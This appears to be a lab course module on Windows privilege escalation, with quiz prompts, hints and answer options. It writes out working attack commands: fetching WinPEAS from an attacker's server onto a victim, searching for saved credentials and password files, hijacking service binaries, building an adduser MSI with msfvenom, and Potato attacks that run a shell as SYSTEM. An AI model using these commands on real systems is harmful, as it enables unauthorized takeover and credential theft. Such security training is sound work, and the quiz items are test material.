title: Windows privilege escalation
description: From user to SYSTEM: services, tokens, registry.

1.title: Windows enumeration
1.body:
## The manual Windows privesc list

```cmd
:: Identity and privileges
whoami /all                        :: user, groups AND PRIVILEGES
whoami /priv                       :: ONLY privileges (SeImpersonate!)

:: Services and paths
wmic service get name,startname,pathname | findstr /i "localSystem"

:: Scheduled tasks
schtasks /query /fo LIST /v | findstr /i "task to run"

:: Installed patches (is a critical hotfix missing?)
wmic qfe list                      :: if KBxxx is missing → kernel exploit

:: Credentials on the system
cmdkey /list                       :: saved credentials
dir /s /p C:\Users\*password* C:\Users\*.env
findstr /si password *.txt *.ini *.cfg
```

## WinPEAS: the Windows LinPEAS

```powershell
# On your machine:
python3 -m http.server 8080
# On the victim (PowerShell):
iwr http://TU_IP:8080/winPEASx64.exe -Outfile C:\Windows\Temp\winpeas.exe
C:\Windows\Temp\winpeas.exe
```

WinPEAS highlights the likely vectors in red/yellow. Its structure follows the
same categories as this room.

## The privilege you are looking for: SeImpersonate

```text
PRIVILEGES INFORMATION
----------------------
SeImpersonatePrivilege        enabled     ← POTATO ATTACK!
SeChangeNotifyPrivilege       enabled
SeCreateGlobalPrivilege       enabled
```

If your shell (typically a web service) has **SeImpersonatePrivilege**, it can
"impersonate" any client that connects to it. **Potato** attacks
(Juicy Potato, Rogue Potato, SweetPotato) trick the Windows Update service into
connecting to YOUR process, stealing its SYSTEM token.

It is THE most common escalation on Windows web services (IIS, SQL Server).

privesc-windows-t01-q03.prompt: Which Windows command lists services with their run-as account (startname) and binary path?
privesc-windows-t01-q03.hint: It is a WMI query on services; you can also do it with Get-CimInstance in PowerShell.

2.title: Services
2.body:
## Unquoted Service Paths: the classic that never dies

When a service has a path WITH SPACES and WITHOUT QUOTES:

```text
C:\Program Files\A\B\service.exe
```

Windows resolves it by trying in this order:

```text
C:\Program.exe          ← does it exist? if so, it runs THIS one!
C:\Program Files\A.exe  ← does it exist?
C:\Program Files\A\B.exe
C:\Program Files\A\B\service.exe  ← the real one
```

If `C:\` is writable → drop your `Program.exe` (a shell or a command that adds
your user to administrators) → restart → the service runs YOUR binary as
LocalSystem.

```cmd
:: Find services with unquoted paths
wmic service get name,pathname | findstr /i "LocalSystem" | findstr /v /i "C:\Windows"
```

## Writable service binaries

More direct: if the service binary is writable by your user:

```cmd
:: 1. Generate your payload (msfvenom or adduser.bat)
echo net localgroup administrators tu_usuario /add > C:\services\custom.exe
:: (in practice: a real binary that adds your user)

:: 2. Restart the service
sc stop CustomSvc
sc start CustomSvc

:: 3. The service runs your command as LocalSystem
```

## Service SID and permissions

```cmd
:: Who can modify the service?
sc sdshow CustomSvc       :: shows the security descriptor
accesschk.exe -wcvu CustomSvc   :: (Sysinternals) shows WRITE permissions
```

If your user has `SERVICE_CHANGE_CONFIG` over a service that runs as
LocalSystem → you can change the binary it runs:

```cmd
sc config CustomSvc binpath= "C:\temp\shell.exe"
sc stop CustomSvc && sc start CustomSvc
```

privesc-windows-t02-q01.prompt: A service runs C:\Program Files\A\B\service.exe (with spaces and NO quotes). Why is that dangerous?
privesc-windows-t02-q01.hint: Windows resolves ambiguous paths by trying candidates from shortest to longest.

options.a: Because the service can never start
options.b: Windows resolves the spaces by trying earlier paths: C:\Program.exe runs first if it exists
options.c: Because paths with spaces get encrypted
options.d: Because it forces the service to run as a normal user

privesc-windows-t02-q02.prompt: The service 'CustomSvc' runs as LocalSystem and its binary C:\services\custom.exe is writable by everyone. How do you escalate?
privesc-windows-t02-q02.hint: Think about what the service will run when you start it again.

options.a: Replace the binary with a shell and restart the service
options.b: Uninstall the service and wait for the next reboot
options.c: Rename the service in the registry
options.d: Just read the binary with a hex editor

privesc-windows-t02-q03.prompt: What command restarts a Windows service?
privesc-windows-t02-q03.hint: sc stop / sc start, or net stop / net start

3.title: AlwaysInstallElevated and more
3.body:
## AlwaysInstallElevated: MSI as SYSTEM

If the admin enabled this policy, ANY .msi is installed with SYSTEM privileges:

```cmd
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
:: Both must be 0x1 (1 as a DWORD)
```

If both are 1:

```bash
# Generate a malicious .msi with msfvenom
msfvenom -p windows/adduser USER=hacker PASS=P@ss -f msi -o /tmp/adduser.msi
# Transfer it and:
msiexec /quiet /qn /i C:\temp\adduser.msi
```

## Potato attacks (SeImpersonate)

The full family:

| Tool | Windows | Mechanism |
|---|---|---|
| Juicy Potato | < Server 2019 | COM + NTLM relay to the Update service |
| Rogue Potato | Server 2019+ | Same but with a remote relay |
| SweetPotato | Universal | Several techniques combined |
| GodPotato | Server 2022+ | Named pipes + PrintSpooler |

```bash
# SweetPotato (the most versatile in labs):
sweetpotato.exe -p "C:\temp\shell.exe"    # runs shell.exe as SYSTEM
```

## Your final Windows privesc checklist

```text
□ whoami /priv → SeImpersonate? → Potato
□ sudo -l equivalent: accesschk -uwcqv user *
□ Services: unquoted paths (wmic service get pathname)
□ Services: writable binaries (accesschk -wcvu)
□ AlwaysInstallElevated: reg query (HKLM + HKCU)
□ Scheduled tasks: schtasks + writable binaries
□ Patches: wmic qfe → is a critical one missing? → kernel exploit
□ Credentials: cmdkey /list, findstr /si password, .env files
□ AutoRun: reg query HKLM\...\Run (writable binaries?)
□ SAM/SYSTEM: can you read C:\Windows\System32\config\SAM?
```

With privesc mastered on both systems, the next modules (password attacks
and pivoting) prepare you for the real-world scenario: compromising a full Active
Directory domain.
